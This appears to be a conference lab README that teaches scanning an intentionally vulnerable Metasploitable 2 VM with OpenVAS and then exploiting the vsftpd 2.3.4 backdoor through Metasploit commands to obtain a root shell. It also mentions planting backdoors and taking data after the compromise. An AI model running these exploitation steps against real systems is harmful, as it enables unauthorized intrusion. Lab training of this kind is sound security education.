# RSSC19-OpenVAS-Lab

## Prerequisites

In order to execute this lab, there are a few things you will need to get started.
1. Installation of Metasploitable 2 VM as an attack target
   * This can be downloaded here: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
   * This lab will not go into how to register the download into your hypervisor, but many tutorials are available online
2. Kali Linux installed to attack the target host
3. Both machines should be connected to the same network
   * **DO NOT** expose the Metasploitable VM to untrusted networks, only your attack host should be able to access the target
4. For this lab we're going to use the IP 192.168.100.10 for the Metasploit target and 192.168.100.11 for the Kali console. Replace these IPs in the instructions with your own if using different ones.

## Attack Execution

Here we will walk through the process of using OpenVAS to scan a host and determine its vulnerabilities.

### Installation of OpenVAS - **SKIP THIS SECTION IF YOU'RE AT THE RSSC19 CONFERENCE, IT HAS ALREADY BEEN DONE FOR YOU**
1. On your Kali installation, open a terminal
2. Install OpenVAS using apt.

```bash
apt install openvas -y
```

3. Once installed, run the setup utility. This allows OpenVAS to start downloading vulnerability information and perform required setup tasks.

```bash
openvas-setup
```

4. This process will take some time to complete. When it's finished, it will print information on how to connect to the service, including the default admin password, which is randomly generated.

![AdminCreds](/screenshots/RSSC19_admin_password.png)

### Login to OpenVAS and Execute Scan

Now we will use OpenVAS to perform a scan against our target host.

1. Launch Firefox (or your preferred web browser) and navigate to https://192.168.100.12:9392
   * If you are executing this on your own and not at RSSC19, the setup should automatically load your browser for you and point you to the service on your localhost, which is https://127.0.0.1:9392
2. Login with the username `admin` and your password.
   * If you are following this exercise at RSSC19, the admin password is `RSSC19`
   * If you are following this exercise at home, you will need to get your default admin password from the steps in the previous section.
3. Once logged in, click `Scans`, then `Tasks` in the fly-down menu

![ScansTasks](/screenshots/RSSC19_1.png)

4. Click the purple `Wizard` icon in the top-left corner

![ScanWizard](/screenshots/RSSC19_2.png)

5. Enter the IP address of the Metasploit VM
   * At RSSC19, the IP is `192.168.100.10`
6. Click `Start Scan`
7. This will take some time to complete. If you are at RSSC19, you can move on to the next section, as a scan has already been run previously and the results are already available

### Reviewing the Results and Finding Vulnerabilities to Exploit

Here we will look at the scan results to find vulnerabilities to exploit

1. Click on `Scans` then `Results`

![ScanResults](/screenshots/RSSC19_3.png)

2. Sort by Severity by clicking on the `Severity` header in the Vulnerability table
   * You may need to click this twice to have it sort in descending order
   
![SortSeverity](/screenshots/RSSC19_4.png)

3. Review some of the vulnerabilities on this page that are of `High` Severity. You can click on the name of the vulnerability to get more detail.
4. Find the vulnerability titled `vsftpd Compromised Source Packages Backdoor Vulnerability` and click on it for more information. This may be a few pages in, click the green arrow on the bottom right to advance the page until you find the vulnerability.
   * Note: There may be more than one of this vulnerability, select the one that shows a Location of `21/tcp`

![vsftpdVuln](/screenshots/RSSC19_5.png)

5. We can learn from this page that there is a backdoor vulnerabillity in this FTP service that can be exploited.

### Finding and Running the Exploit

1. Open a terminal and launch the metasplpoit console, which is used to find vulnerabilities and execute their exploits

```bash
msfconsole
```

2. Search for any exploits related to the `vsftpd` service we discovered vulnerabilities for in the previous section

```bash
search vsftpd
```

3. There is one exploit available, and it is for `Backdoor Command Execution`, which is the vulnerability we found in OpenVAS. Let's select the exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

4. Review the options available for the exploit

```bash
show options
```

5. RPORT is already set to 21, which is correct based on the OpenVAS result showing the vulnerability on that port. We need to set the target IP though, which is the Metasploitable VM.

```bash
set RHOSTS 192.168.100.10
```

6. Now that all the required options are set, run the exploit

```bash
run
```

7. If successful, this should grant you a root shell to the target box. To confirm, run the following commands to verify hostname, IP, and logged in user of your remote shell

```bash
ip a
hostname
whoami
```
   * Notice the IP address 192.168.100.10 is listed, which belongs to our target host, and the hostname is metasploitable, as expected. The result of the `whoami` command should be `root`, indicating your root access.
   
8. From here you have full control of the target and you can perform any commands you wish, such as installing backdoors for access later, malware, obtaining sensitive information on the filesystem, etc.

# Conclusion

we hope this has been useful in seeing the process of scanning a target system for exploitable vulnerabilities, determining which are exploitable, finding the exploits, and executing them to gain access to a target host. It is a good idea to run vulnerability scanners like this in your own environment to determine where your weaknesses are so you can correct them before a malicious actor finds them instead.
